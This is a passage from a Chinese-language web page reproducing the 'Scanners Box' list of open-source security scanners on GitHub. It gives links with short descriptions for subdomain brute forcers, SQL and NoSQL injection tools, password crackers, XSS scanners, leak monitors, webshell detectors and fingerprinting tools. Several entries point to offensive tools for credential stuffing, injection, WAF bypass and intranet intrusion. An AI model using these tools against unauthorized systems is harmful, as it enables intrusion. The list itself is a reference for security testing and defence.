rel="noopener">https://github.com/laramies/theHarvester</a></p><p>网络资产识别引擎，漏洞检测引擎<br><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a></p><p>.svn文件夹泄漏利用工具<br><a href="https://github.com/shengqi158/svnhack" target="_blank" rel="noopener">https://github.com/shengqi158/svnhack</a></p><p>GitHub敏感信息扫描工具,包括检测commit等<br><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a></p><p>企业资产、敏感信息GitHub泄露监控系统<br><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a></p><p>.git文件夹泄漏利用工具<br><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><p>自动化对指定域名进行Google hacking搜索并收集信息<br><a href="https://github.com/1N3/Goohak" target="_blank" rel="noopener">https://github.com/1N3/Goohak</a></p><p>Web站点信息搜集工具，包括邮箱、电话等信息<br><a href="https://github.com/1N3/BlackWidow" target="_blank" rel="noopener">https://github.com/1N3/BlackWidow</a></p><p>可以提取网址，电子邮件，文件，网站帐户等的高速爬虫<br><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a></p><p><strong>webshell检测或木马分析工具</strong></p><p>测试效率高达99%的webshell检测工具<br><a href="https://github.com/emposha/PHP-Shell-Detector/" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector/</a></p><p><strong>内网渗透或扫描工具</strong></p><p>自动化利用XSS入侵内网<br><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="noopener">https://github.com/BlackHole1/WebRtcXSS</a></p><p>调用 Windows API 枚举用户登录信息<br><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter</a></p><p><strong>中间件扫描器或指纹识别工具</strong></p><p>目标端口扫描+系统服务指纹识别<br><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a></p><p>WAF产品指纹识别<br><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a></p><p>动态多线程敏感信息泄露检测工具<br><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a></p><p>web路径收集与扫描<br><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a></p><p>尝试找出cdn背后的真实ip<br><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a></p><p>基于Bing搜索引擎的C段/旁站查询，多线程，支持API<br><a href="https://github.com/Xyntax/BingC" target="_blank" rel="noopener">https://github.com/Xyntax/BingC</a></p><p>多线程WEB目录爆破工具<br><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a></p><p>CDN识别、检测<br><a href="https://github.com/Nitr4x/whichCDN" target="_blank" rel="noopener">https://github.com/Nitr4x/whichCDN</a></p><p>服务器ssh配置信息扫描<br><a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a></p><p>类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议<br><a href="https://github.com/chichou/grab.js" target="_blank" rel="noopener">https://github.com/chichou/grab.js</a></p><p>敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描<br><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">https://github.com/Mosuan/FileScan</a></p><p>Web应用fuzz工具、框架，同时可用于web路径/服务扫描<br><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a></p><p>(Web应用fuzz工具、框架，同时可用于web路径/服务扫描<br><a href="https://github.com/dzonerzy/goWAPT" target="_blank" rel="noopener">https://github.com/dzonerzy/goWAPT</a></p><p>通过字典穷举、google、robots.txt等途径的跨平台后台管理路径扫描器<br><a href="https://github.com/fnk0c/cangibrina" target="_blank" rel="noopener">https://github.com/fnk0c/cangibrina</a></p><p>通过扫描全网获得真实IP的自动化程序<br><a href="https://github.com/boy-hack/w8fuckcdn" target="_blank" rel="noopener">https://github.com/boy-hack/w8fuckcdn</a></p><p>数据库文件、私钥等敏感文件泄露扫描<br><a href="https://github.com/MetaChar/pyHAWK" target="_blank" rel="noopener">https://github.com/MetaChar/pyHAWK</a></p><p><strong>高级持续性威胁(APT)相关工具</strong></p><p>一款APT入侵痕迹扫描器<br><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="noopener">https://github.com/Neo23x0/Loki</a></p><br><h2 id="Scanners-Box"><a href="#Scanners-Box" class="headerlink" title="Scanners Box"></a>Scanners Box</h2><h3 id="项目简介"><a href="#项目简介" class="headerlink" title="项目简介"></a>项目简介</h3><p><strong>Scanners Box (简称 - scanbox)</strong> 是一个集合github平台上的安全行业从业者自研开源扫描器的仓库，包括子域名枚举、数据库漏洞扫描、弱口令或信息泄漏扫描、端口扫描、指纹识别以及其他大型扫描器或模块化扫描器，<strong>同时该仓库只收录各位安全行业从业者自己编写的一般性开源扫描器，类似awvs、nmap、w3af等知名扫描工具不收录</strong>。</p><hr><h4 id="子域名枚举扫描器或爆破工具"><a href="#子域名枚举扫描器或爆破工具" class="headerlink" title="子域名枚举扫描器或爆破工具"></a>子域名枚举扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/subDomainsBrute" target="_blank" rel="noopener">https://github.com/lijiejie/subDomainsBrute</a> (lijiejie开发的一款使用广泛的子域名爆破枚举工具)</li><li><a href="https://github.com/ring04h/wydomain" target="_blank" rel="noopener">https://github.com/ring04h/wydomain</a> (猪猪侠开发的一款域名收集全面、精准的子域名枚举工具)</li><li><a href="https://github.com/le4f/dnsmaper" target="_blank" rel="noopener">https://github.com/le4f/dnsmaper</a> (子域名枚举爆破工具以及地图位置标记)</li><li><a href="https://github.com/0xbug/orangescan" target="_blank" rel="noopener">https://github.com/0xbug/orangescan</a> (提供web界面的在线子域名信息收集工具)</li><li><a href="https://github.com/TheRook/subbrute" target="_blank" rel="noopener">https://github.com/TheRook/subbrute</a> （高效精准的子域名爆破工具,同时也是扫描器中最常用的子域名API库)</li><li><a href="https://github.com/We5ter/GSDF" target="_blank" rel="noopener">https://github.com/We5ter/GSDF</a> (基于谷歌SSL透明证书的子域名查询脚本)</li><li><a href="https://github.com/mandatoryprogrammer/cloudflare_enum" target="_blank" rel="noopener">https://github.com/mandatoryprogrammer/cloudflare_enum</a> （使用CloudFlare进行子域名枚举的脚本）</li><li><a href="https://github.com/guelfoweb/knock" target="_blank" rel="noopener">https://github.com/guelfoweb/knock</a> (Knock子域名获取，可用于查找子域名接管漏洞)</li><li><a href="https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker" target="_blank" rel="noopener">https://github.com/exp-db/PythonPool/tree/master/Tools/DomainSeeker</a> （多方式收集目标子域名信息）</li><li><a href="https://github.com/code-scan/BroDomain" target="_blank" rel="noopener">https://github.com/code-scan/BroDomain</a> (兄弟域名查询）</li><li><a href="https://github.com/chuhades/dnsbrute" target="_blank" rel="noopener">https://github.com/chuhades/dnsbrute</a> (高效的子域名爆破工具)</li><li><a href="https://github.com/yanxiu0614/subdomain3" target="_blank" rel="noopener">https://github.com/yanxiu0614/subdomain3</a> (一款高效的子域名爆破工具）</li><li><a href="https://github.com/michenriksen/aquatone" target="_blank" rel="noopener">https://github.com/michenriksen/aquatone</a> (子域名枚举、探测工具。可用于子域名接管漏洞探测)</li><li><a href="https://github.com/evilsocket/dnssearch" target="_blank" rel="noopener">https://github.com/evilsocket/dnssearch</a> (一款子域名爆破工具)</li><li><a href="https://github.com/reconned/domained" target="_blank" rel="noopener">https://github.com/reconned/domained</a> (可用于子域名收集的一款工具）</li><li><a href="https://github.com/bit4woo/Teemo" target="_blank" rel="noopener">https://github.com/bit4woo/Teemo</a> (域名收集及枚举工具)</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> (邮箱、服务器信息收集及子域名枚举工具）</li><li><a href="https://github.com/swisskyrepo/Subdomino" target="_blank" rel="noopener">https://github.com/swisskyrepo/Subdomino</a> (子域名枚举，端口扫描，服务存活确认）</li><li><a href="https://github.com/nmalcolm/Inventus" target="_blank" rel="noopener">https://github.com/nmalcolm/Inventus</a> (通过爬虫实现的子域名收集工具）</li><li><a href="https://github.com/aboul3la/Sublist3r" target="_blank" rel="noopener">https://github.com/aboul3la/Sublist3r</a> (快速子域枚举工具)</li><li><a href="https://github.com/jonluca/Anubis" target="_blank" rel="noopener">https://github.com/jonluca/Anubis</a> （子域名枚举及信息搜集工具）</li><li><a href="https://github.com/n4xh4ck5/N4xD0rk" target="_blank" rel="noopener">https://github.com/n4xh4ck5/N4xD0rk</a> (子域名查询工具)</li><li><a href="https://github.com/infosec-au/altdns" target="_blank" rel="noopener">https://github.com/infosec-au/altdns</a> (一款高效的子域名爆破工具)</li><li><a href="https://github.com/FeeiCN/ESD" target="_blank" rel="noopener">https://github.com/FeeiCN/ESD</a> (基于AsyncIO协程以及非重复字典的子域名爆破工具)</li><li><a href="https://github.com/giovanifss/Dumb" target="_blank" rel="noopener">https://github.com/giovanifss/Dumb</a> (快速而灵活的子域名爆破工具)</li><li><a href="https://github.com/UnaPibaGeek/ctfr" target="_blank" rel="noopener">https://github.com/UnaPibaGeek/ctfr</a> (通过域名透明证书记录获取子域名)</li><li><a href="https://github.com/caffix/amass" target="_blank" rel="noopener">https://github.com/caffix/amass</a> (Go语言开发的子域名枚举工具)</li><li><a href="https://github.com/Ice3man543/subfinder" target="_blank" rel="noopener">https://github.com/Ice3man543/subfinder</a> (继承于sublist3r项目的模块化体系结构，一个强劲的子域名枚举工具)</li></ul><h4 id="数据库类漏洞扫描器或爆破工具"><a href="#数据库类漏洞扫描器或爆破工具" class="headerlink" title="数据库类漏洞扫描器或爆破工具"></a>数据库类漏洞扫描器或爆破工具</h4><ul><li><a href="https://github.com/0xbug/SQLiScanner" target="_blank" rel="noopener">https://github.com/0xbug/SQLiScanner</a> (一款基于SQLMAP和Charles的被动SQL注入漏洞扫描工具)</li><li><a href="https://github.com/stamparm/DSSS" target="_blank" rel="noopener">https://github.com/stamparm/DSSS</a> (99行代码实现的sql注入漏洞扫描器)</li><li><a href="https://github.com/LoRexxar/Feigong" target="_blank" rel="noopener">https://github.com/LoRexxar/Feigong</a> （针对各种情况自由变化的MySQL注入脚本）</li><li><a href="https://github.com/youngyangyang04/NoSQLAttack" target="_blank" rel="noopener">https://github.com/youngyangyang04/NoSQLAttack</a> (一款针对mongoDB的攻击工具)</li><li><a href="https://github.com/Neohapsis/bbqsql" target="_blank" rel="noopener">https://github.com/Neohapsis/bbqsql</a> （SQL盲注利用框架）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> （攻击SQLSERVER的Powershell脚本框架）</li><li><a href="https://github.com/WhitewidowScanner/whitewidow" target="_blank" rel="noopener">https://github.com/WhitewidowScanner/whitewidow</a> (一款数据库扫描器)</li><li><a href="https://github.com/stampery/mongoaudit" target="_blank" rel="noopener">https://github.com/stampery/mongoaudit</a> (MongoDB审计及渗透工具）</li><li><a href="https://github.com/torque59/Nosql-Exploitation-Framework" target="_blank" rel="noopener">https://github.com/torque59/Nosql-Exploitation-Framework</a> (NoSQL扫描/爆破工具）</li><li><a href="https://github.com/missDronio/blindy" target="_blank" rel="noopener">https://github.com/missDronio/blindy</a> (MySQL盲注爆破工具）</li><li><a href="https://github.com/fengxuangit/Fox-scan" target="_blank" rel="noopener">https://github.com/fengxuangit/Fox-scan</a> (基于SQLMAP的主动和被动资源发现的漏洞扫描工具）</li><li><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a> (用于SQL Server审计的powershell脚本）</li><li><a href="https://github.com/JohnTroony/Blisqy" target="_blank" rel="noopener">https://github.com/JohnTroony/Blisqy</a> （用于http header中的时间盲注爆破工具，仅针对MySQL/MariaDB）</li><li><a href="https://github.com/ron190/jsql-injection" target="_blank" rel="noopener">https://github.com/ron190/jsql-injection</a> (Java 编写的SQL注入工具)</li><li><a href="https://github.com/Hadesy2k/sqliv" target="_blank" rel="noopener">https://github.com/Hadesy2k/sqliv</a> (基于搜索引擎的批量SQL注入漏洞扫描器）</li><li><a href="https://github.com/s0md3v/sqlmate" target="_blank" rel="noopener">https://github.com/s0md3v/sqlmate</a> (在sqlmap基础上增加了目录扫描、hash爆破等功能)</li><li><a href="https://github.com/m8r0wn/enumdb" target="_blank" rel="noopener">https://github.com/m8r0wn/enumdb</a> (MySQL以及MSSQL爆破脱裤工具）</li><li><a href="https://github.com/9tail123/wooscan" target="_blank" rel="noopener">https://github.com/9tail123/wooscan</a> (批量查询网站在乌云是否存在忽略的sql注入漏洞并自动调用sqlmap测试)</li></ul><h4 id="弱口令-弱用户名扫描器或爆破工具"><a href="#弱口令-弱用户名扫描器或爆破工具" class="headerlink" title="弱口令/弱用户名扫描器或爆破工具"></a>弱口令/弱用户名扫描器或爆破工具</h4><ul><li><a href="https://github.com/lijiejie/htpwdScan" target="_blank" rel="noopener">https://github.com/lijiejie/htpwdScan</a> (一个简单的HTTP暴力破解、撞库攻击脚本)</li><li><a href="https://github.com/ysrc/F-Scrack" target="_blank" rel="noopener">https://github.com/ysrc/F-Scrack</a> （对各类服务进行弱口令检测的脚本)</li><li><a href="https://github.com/Mebus/cupp" target="_blank" rel="noopener">https://github.com/Mebus/cupp</a> （根据用户习惯生成弱口令探测字典脚本）</li><li><a href="https://github.com/netxfly/crack_ssh" target="_blank" rel="noopener">https://github.com/netxfly/crack_ssh</a> （Go写的协程版的ssh\redis\mongodb弱口令破解工具）</li><li><a href="https://github.com/LandGrey/pydictor" target="_blank" rel="noopener">https://github.com/LandGrey/pydictor</a> (暴力破解字典建立工具)</li><li><a href="https://github.com/shengqi158/weak_password_detect" target="_blank" rel="noopener">https://github.com/shengqi158/weak_password_detect</a> (多线程探测弱口令）</li><li><a href="https://github.com/s0md3v/Blazy" target="_blank" rel="noopener">https://github.com/s0md3v/Blazy</a> (支持测试 CSRF, Clickjacking, Cloudflare and WAF的弱口令探测器）</li><li><a href="https://github.com/MooseDojo/myBFF" target="_blank" rel="noopener">https://github.com/MooseDojo/myBFF</a> (对CiscoVPN、Citrix Gateway等各类服务进行弱口令检测的脚本)</li></ul><h4 id="物联网设备识别工具或扫描器"><a href="#物联网设备识别工具或扫描器" class="headerlink" title="物联网设备识别工具或扫描器"></a>物联网设备识别工具或扫描器</h4><ul><li><a href="https://github.com/rapid7/IoTSeeker" target="_blank" rel="noopener">https://github.com/rapid7/IoTSeeker</a> （物联网设备默认密码扫描检测工具)</li><li><a href="https://github.com/shodan-labs/iotdb" target="_blank" rel="noopener">https://github.com/shodan-labs/iotdb</a> (使用nmap扫描IoT设备)</li><li><a href="https://github.com/googleinurl/RouterHunterBR" target="_blank" rel="noopener">https://github.com/googleinurl/RouterHunterBR</a> （路由器设备漏洞扫描利用)</li><li><a href="https://github.com/scu-igroup/telnet-scanner" target="_blank" rel="noopener">https://github.com/scu-igroup/telnet-scanner</a> (Telnet服务密码撞库)</li><li><a href="https://github.com/viraintel/OWASP-Nettacker" target="_blank" rel="noopener">https://github.com/viraintel/OWASP-Nettacker</a> (自动化信息搜集及渗透测试工具，比较适用于IoT扫描)</li><li><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a> (嵌入式设备漏洞扫描及利用工具)</li></ul><h4 id="反射型或DOM-Based-XSS扫描器"><a href="#反射型或DOM-Based-XSS扫描器" class="headerlink" title="反射型或DOM-Based XSS扫描器"></a>反射型或DOM-Based XSS扫描器</h4><ul><li><a href="https://github.com/shawarkhanethicalhacker/BruteXSS" target="_blank" rel="noopener">https://github.com/shawarkhanethicalhacker/BruteXSS</a> （一款XSS扫描器,可暴力注入参数）</li><li><a href="https://github.com/1N3/XSSTracer" target="_blank" rel="noopener">https://github.com/1N3/XSSTracer</a> (小型XSS扫描器,也可检测CRLF、XSS、点击劫持的)</li><li><a href="https://github.com/0x584A/fuzzXssPHP" target="_blank" rel="noopener">https://github.com/0x584A/fuzzXssPHP</a> (PHP版本的反射型xss扫描)</li><li><a href="https://github.com/chuhades/xss_scan" target="_blank" rel="noopener">https://github.com/chuhades/xss_scan</a> (批量扫描XSS的python脚本）</li><li><a href="https://github.com/BlackHole1/autoFindXssAndCsrf" target="_blank" rel="noopener">https://github.com/BlackHole1/autoFindXssAndCsrf</a> (自动化检测页面是否存在XSS和CSRF漏洞的浏览器插件）</li><li><a href="https://github.com/shogunlab/shuriken" target="_blank" rel="noopener">https://github.com/shogunlab/shuriken</a> (使用命令行进行XSS批量检测)</li><li><a href="https://github.com/s0md3v/XSStrike" target="_blank" rel="noopener">https://github.com/s0md3v/XSStrike</a> (可识别并绕过WAF的XSS扫描工具)</li><li><a href="https://github.com/stamparm/DSXS" target="_blank" rel="noopener">https://github.com/stamparm/DSXS</a> (支持GET、POST方式的高效XSS扫描器）</li></ul><h4 id="企业资产管理或信息泄露搜集工具"><a href="#企业资产管理或信息泄露搜集工具" class="headerlink" title="企业资产管理或信息泄露搜集工具"></a>企业资产管理或信息泄露搜集工具</h4><ul><li><a href="https://github.com/ysrc/xunfeng" target="_blank" rel="noopener">https://github.com/ysrc/xunfeng</a> (网络资产识别引擎，漏洞检测引擎）</li><li><a href="https://github.com/laramies/theHarvester" target="_blank" rel="noopener">https://github.com/laramies/theHarvester</a> （企业被搜索引擎收录敏感资产信息监控脚本：员工邮箱、子域名、Hosts）</li><li><a href="https://github.com/x0day/Multisearch-v2" target="_blank" rel="noopener">https://github.com/x0day/Multisearch-v2</a>  (Bing、google、360、zoomeye等搜索引擎聚合搜索，可用于发现企业被搜索引擎收录的敏感资产信息）</li><li><a href="https://github.com/Ekultek/Zeus-Scanner" target="_blank" rel="noopener">https://github.com/Ekultek/Zeus-Scanner</a> (集成化的综合搜索引擎，能够抓取被搜索引擎隐藏的url,并交由sqlmap、nmap扫描）</li><li><a href="https://github.com/0xbug/Biu-framework" target="_blank" rel="noopener">https://github.com/0xbug/Biu-framework</a> (企业内网基础服务安全扫描框架)</li><li><a href="https://github.com/metac0rtex/GitHarvester" target="_blank" rel="noopener">https://github.com/metac0rtex/GitHarvester</a> (github Repo信息搜集工具)</li><li><a href="https://github.com/shengqi158/svnhack" target="_blank" rel="noopener">https://github.com/shengqi158/svnhack</a> （<code>.svn</code>文件夹泄漏利用工具）</li><li><a href="https://github.com/repoog/GitPrey" target="_blank" rel="noopener">https://github.com/repoog/GitPrey</a> (GitHub敏感信息扫描工具)</li><li><a href="https://github.com/0xbug/Hawkeye" target="_blank" rel="noopener">https://github.com/0xbug/Hawkeye</a> (企业资产、敏感信息GitHub泄露监控系统）</li><li><a href="https://github.com/lianfeng30/githubscan" target="_blank" rel="noopener">https://github.com/lianfeng30/githubscan</a> （根据企业关键词进行项目检索以及相应敏感文件和文件内容扫描的工具）</li><li><a href="https://github.com/UnkL4b/GitMiner" target="_blank" rel="noopener">https://github.com/UnkL4b/GitMiner</a> （github敏感信息搜索工具）</li><li><a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a> (<code>.git</code>文件夹泄漏利用工具) </li><li><a href="https://github.com/dxa4481/truffleHog" target="_blank" rel="noopener">https://github.com/dxa4481/truffleHog</a> (GitHub敏感信息扫描工具,包括检测commit等)</li><li><a href="https://github.com/1N3/Goohak" target="_blank" rel="noopener">https://github.com/1N3/Goohak</a> （自动化对指定域名进行Google hacking搜索并收集信息）</li><li><a href="https://github.com/UKHomeOffice/repo-security-scanner" target="_blank" rel="noopener">https://github.com/UKHomeOffice/repo-security-scanner</a> (用于搜索git commit中的敏感信息，例如密码、私钥等的客户端工具)</li><li><a href="https://github.com/FeeiCN/GSIL" target="_blank" rel="noopener">https://github.com/FeeiCN/GSIL</a> (Github敏感信息泄露扫描)</li><li><a href="https://github.com/MiSecurity/x-patrol" target="_blank" rel="noopener">https://github.com/MiSecurity/x-patrol</a> (Github泄露巡航工具)</li><li><a href="https://github.com/1N3/BlackWidow" target="_blank" rel="noopener">https://github.com/1N3/BlackWidow</a> (Web站点信息搜集工具，包括邮箱、电话等信息）</li><li><a href="https://github.com/anshumanbh/git-all-secrets" target="_blank" rel="noopener">https://github.com/anshumanbh/git-all-secrets</a> (集合多个开源GitHub敏感信息扫描的企业信息泄露巡航工具)</li><li><a href="https://github.com/s0md3v/Photon" target="_blank" rel="noopener">https://github.com/s0md3v/Photon</a> (可以提取网址，电子邮件，文件，网站帐户等的高速爬虫)</li><li><a href="https://github.com/VKSRC/Github-Monitor" target="_blank" rel="noopener">https://github.com/VKSRC/Github-Monitor</a> (由vipkid SRC开发的Github信息泄漏监控系统)</li></ul><h4 id="webshell检测或木马分析工具"><a href="#webshell检测或木马分析工具" class="headerlink" title="webshell检测或木马分析工具"></a>webshell检测或木马分析工具</h4><ul><li><a href="https://github.com/he1m4n6a/findWebshell" target="_blank" rel="noopener">https://github.com/he1m4n6a/findWebshell</a> （一款简单的webshell检测工具)</li><li><a href="https://github.com/Tencent/HaboMalHunter" target="_blank" rel="noopener">https://github.com/Tencent/HaboMalHunter</a> （哈勃分析系统，linux系统病毒分析及安全检测）</li><li><a href="https://github.com/PlagueScanner/PlagueScanner" target="_blank" rel="noopener">https://github.com/PlagueScanner/PlagueScanner</a> (使用python实现的集成ClamAV、ESET、Bitdefender的反病毒引擎)</li><li><a href="https://github.com/nbs-system/php-malware-finder" target="_blank" rel="noopener">https://github.com/nbs-system/php-malware-finder</a> (一款高效率PHP-webshell扫描工具)</li><li><a href="https://github.com/emposha/PHP-Shell-Detector/" target="_blank" rel="noopener">https://github.com/emposha/PHP-Shell-Detector/</a> (测试效率高达99%的webshell检测工具)</li><li><a href="https://github.com/erevus-cn/scan_webshell" target="_blank" rel="noopener">https://github.com/erevus-cn/scan_webshell</a> (一款简洁的Webshell扫描工具）</li><li><a href="https://github.com/emposha/Shell-Detector" target="_blank" rel="noopener">https://github.com/emposha/Shell-Detector</a> （Webshell扫描工具，支持php/perl/asp/aspx webshell扫描)</li><li><a href="https://github.com/m4rco-/dorothy2" target="_blank" rel="noopener">https://github.com/m4rco-/dorothy2</a> (一款木马、僵尸网络分析框架）</li><li><a href="https://github.com/droidefense/engine" target="_blank" rel="noopener">https://github.com/droidefense/engine</a> (高级安卓木马病毒分析框架）</li></ul><h4 id="内网渗透或扫描工具"><a href="#内网渗透或扫描工具" class="headerlink" title="内网渗透或扫描工具"></a>内网渗透或扫描工具</h4><ul><li><a href="https://github.com/lcatro/network_backdoor_scanner" target="_blank" rel="noopener">https://github.com/lcatro/network_backdoor_scanner</a> （基于网络流量的内网探测框架）</li><li><a href="https://github.com/fdiskyou/hunter" target="_blank" rel="noopener">https://github.com/fdiskyou/hunter</a> （调用 Windows API 枚举用户登录信息）</li><li><a href="https://github.com/BlackHole1/WebRtcXSS" target="_blank" rel="noopener">https://github.com/BlackHole1/WebRtcXSS</a> （自动化利用XSS入侵内网）</li></ul><h4 id="中间件扫描器或指纹识别工具"><a href="#中间件扫描器或指纹识别工具" class="headerlink" title="中间件扫描器或指纹识别工具"></a>中间件扫描器或指纹识别工具</h4><ul><li><a href="https://github.com/ring04h/wyportmap" target="_blank" rel="noopener">https://github.com/ring04h/wyportmap</a> (目标端口扫描+系统服务指纹识别)</li><li><a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="noopener">https://github.com/ring04h/weakfilescan</a> (动态多线程敏感信息泄露检测工具)</li><li><a href="https://github.com/EnableSecurity/wafw00f" target="_blank" rel="noopener">https://github.com/EnableSecurity/wafw00f</a> (WAF产品指纹识别)</li><li><a href="https://github.com/rbsec/sslscan" target="_blank" rel="noopener">https://github.com/rbsec/sslscan</a> （SSL类型识别)</li><li><a href="https://github.com/urbanadventurer/whatweb" target="_blank" rel="noopener">https://github.com/urbanadventurer/whatweb</a> (Web指纹识别)</li><li><a href="https://github.com/tanjiti/FingerPrint" target="_blank" rel="noopener">https://github.com/tanjiti/FingerPrint</a> (Web应用指纹识别)</li><li><a href="https://github.com/nanshihui/Scan-T" target="_blank" rel="noopener">https://github.com/nanshihui/Scan-T</a> （网络爬虫式指纹识别)</li><li><a href="https://github.com/OffensivePython/Nscan" target="_blank" rel="noopener">https://github.com/OffensivePython/Nscan</a> (基于Masscan和Zmap的网络扫描器)</li><li><a href="https://github.com/ywolf/F-NAScan" target="_blank" rel="noopener">https://github.com/ywolf/F-NAScan</a> (网络资产信息扫描, ICMP存活探测,端口扫描，端口指纹服务识别）</li><li><a href="https://github.com/ywolf/F-MiddlewareScan" target="_blank" rel="noopener">https://github.com/ywolf/F-MiddlewareScan</a> （中间件扫描）</li><li><a href="https://github.com/maurosoria/dirsearch" target="_blank" rel="noopener">https://github.com/maurosoria/dirsearch</a> (web路径收集与扫描)</li><li><a href="https://github.com/x0day/bannerscan" target="_blank" rel="noopener">https://github.com/x0day/bannerscan</a> （C段Banner与路径扫描）</li><li><a href="https://github.com/RASSec/RASscan" target="_blank" rel="noopener">https://github.com/RASSec/RASscan</a> (端口服务扫描)</li><li><a href="https://github.com/3xp10it/bypass_waf" target="_blank" rel="noopener">https://github.com/3xp10it/bypass_waf</a> （waf自动暴破）</li><li><a href="https://github.com/3xp10it/xcdn" target="_blank" rel="noopener">https://github.com/3xp10it/xcdn</a> (尝试找出cdn背后的真实ip)  </li><li><a href="https://github.com/Xyntax/BingC" target="_blank" rel="noopener">https://github.com/Xyntax/BingC</a> （基于Bing搜索引擎的C段/旁站查询，多线程，支持API）</li><li><a href="https://github.com/Xyntax/DirBrute" target="_blank" rel="noopener">https://github.com/Xyntax/DirBrute</a> （多线程WEB目录爆破工具）</li><li><a href="https://github.com/zer0h/httpscan" target="_blank" rel="noopener">https://github.com/zer0h/httpscan</a> （一个爬虫式的网段Web主机发现小工具）</li><li><a href="https://github.com/lietdai/doom" target="_blank" rel="noopener">https://github.com/lietdai/doom</a> （Thorn上实现的分布式任务分发的ip端口漏洞扫描器）</li><li><a href="https://github.com/chichou/grab.js" target="_blank" rel="noopener">https://github.com/chichou/grab.js</a> (类似 zgrab 的快速 TCP 指纹抓取解析工具，支持更多协议)</li><li><a href="https://github.com/Nitr4x/whichCDN" target="_blank" rel="noopener">https://github.com/Nitr4x/whichCDN</a> (CDN识别、检测）</li><li><a href="https://github.com/secfree/bcrpscan" target="_blank" rel="noopener">https://github.com/secfree/bcrpscan</a> (基于爬虫的web路径扫描器)</li><li><a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a> (服务器ssh配置信息扫描）</li><li><a href="https://github.com/18F/domain-scan" target="_blank" rel="noopener">https://github.com/18F/domain-scan</a> (针对域名及其子域名的资产数据检测／扫描，包括http/https检测等）</li><li><a href="https://github.com/ggusoft/inforfinder" target="_blank" rel="noopener">https://github.com/ggusoft/inforfinder</a> (域名资产收集及指纹识别工具）</li><li><a href="https://github.com/boy-hack/gwhatweb" target="_blank" rel="noopener">https://github.com/boy-hack/gwhatweb</a> (CMS识别 python gevent实现)</li><li><a href="https://github.com/Mosuan/FileScan" target="_blank" rel="noopener">https://github.com/Mosuan/FileScan</a> (敏感文件扫描 / 二次判断降低误报率 / 扫描内容规则化 / 多目录扫描)</li><li><a href="https://github.com/Xyntax/FileSensor" target="_blank" rel="noopener">https://github.com/Xyntax/FileSensor</a> (基于爬虫的动态敏感文件探测工具)</li><li><a href="https://github.com/deibit/cansina" target="_blank" rel="noopener">https://github.com/deibit/cansina</a> (web路径扫描工具）</li><li><a href="https://github.com/0xbug/Howl" target="_blank" rel="noopener">https://github.com/0xbug/Howl</a> (网络设备 web 服务指纹扫描与检索)</li><li><a href="https://github.com/mozilla/cipherscan" target="_blank" rel="noopener">https://github.com/mozilla/cipherscan</a> (目标主机服务ssl类型识别)</li><li><a href="https://github.com/xmendez/wfuzz" target="_blank" rel="noopener">https://github.com/xmendez/wfuzz</a> (Web应用fuzz工具、框架，同时可用于web路径/服务扫描）</li><li><a href="https://github.com/s0md3v/Breacher" target="_blank" rel="noopener">https://github.com/s0md3v/Breacher</a> (多线程的后台路径扫描器，也可用于发现Execution After Redirect漏洞）</li><li><a href="https://github.com/ztgrace/changeme" target="_blank" rel="noopener">https://github.com/ztgrace/changeme</a> (弱口令扫描器，不仅支持普通登录页，也支持ssh、mongodb等组件）</li><li><a href="https://github.com/medbenali/CyberScan" target="_blank" rel="noopener">https://github.com/medbenali/CyberScan</a> (渗透测试辅助工具，支持分析数据包、解码、端口扫描、IP地址分析等）</li><li><a href="https://github.com/m0nad/HellRaiser" target="_blank" rel="noopener">https://github.com/m0nad/HellRaiser</a> (基于nmap的扫描器，与cve漏洞关联）</li><li><a href="https://github.com/scipag/vulscan" target="_blank" rel="noopener">https://github.com/scipag/vulscan</a> (基于nmap的高级漏洞扫描器，命令行环境使用）</li><li><a href="https://github.com/jekyc/wig" target="_blank" rel="noopener">https://github.com/jekyc/wig</a> (web应用信息搜集工具）</li><li><a href="https://github.com/eldraco/domain_analyzer" target="_blank" rel="noopener">https://github.com/eldraco/domain_analyzer</a> (围绕web服务的域名进行信息收集和”域传送”等漏洞扫描，也支持针对背后的服务器端口扫描等）</li><li><a href="https://github.com/cloudtracer/paskto" target="_blank" rel="noopener">https://github.com/cloudtracer/paskto</a> 